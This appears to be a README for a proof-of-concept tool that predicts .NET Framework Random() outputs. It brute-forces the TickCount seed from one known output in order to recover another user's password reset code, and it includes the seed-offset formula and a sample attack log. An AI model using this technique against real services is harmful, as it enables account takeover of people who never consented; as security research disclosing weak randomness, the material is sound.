# net-framework-prng-oracle
The default `Random()` constructor in .NET Framework applications is [seeded](https://learn.microsoft.com/en-us/dotnet/api/system.random.-ctor?view=net-7.0) with machine's `TickCount` value -- milliseconds since boot.
`TickCount` is an unsigned 32-bit integer and can only have `4,294,967,295` possible values.

If you know the source code of the algorithm, it is possible to predict its result at any given point of time by obtaining the
output at point `X`, brute-forcing the associated `TickCount` seed value `A`, and then computing seed value `B` like so:

```
B = A + (Y - X)
```
Knowing seed value `B`, we can run the algorithm normally to obtain the desired result, e.g. a newly generated "random" password.

Since the default seed is bound to the milliseconds since the server's boot, this value is bound to be low if the machine is restarted often.

The provided code serves as an example attack on a password reset code that uses weak `Random()` function to generate its output. 
You can see full article describing this attack [here](TODO: edit me). Nonetheless, this type of attack is applicable to any algorithm that uses
PRNG `Random()` to generate its output.

### PoC
```
[!] Parsed PRNG results: [
        "Timestamp: "4/21/2022 8:59:12 PM"; Result: "!CJ.4nFHmYZ*"; Seed: -1"
]
[!] Parsed victim PRNG result timestamp: "4/21/2022 11:11:35 PM"
[!] Brute-forcing Random() seeds for the results
[*] [20:21:55] Result: "!CJ.4nFHmYZ*"; 0.00% done. 0 values processed
[*] [20:22:15] Result: "!CJ.4nFHmYZ*"; 0.39% done. 16,777,216 values processed
[+] [20:22:30] Result: "!CJ.4nFHmYZ*"; Found! Seed: 29774936
[!] Generating possible results in a 2 second window
[*] Attacker's timestamp: "4/21/2022 8:59:12 PM"; Victim's timestamp: "4/21/2022 11:11:35 PM"; Offset in milliseconds: 7943000
[*] Computed victim's seed value: 37717936 +- 2000 milliseconds
[+] Possible results saved to C:\Users\Administrator\Desktop\projects\net-framework-prng-oracle\PrngOracle\PrngOracle\bin\Debug\net6.0\results.txt
[+] Done! Happy hacking!
```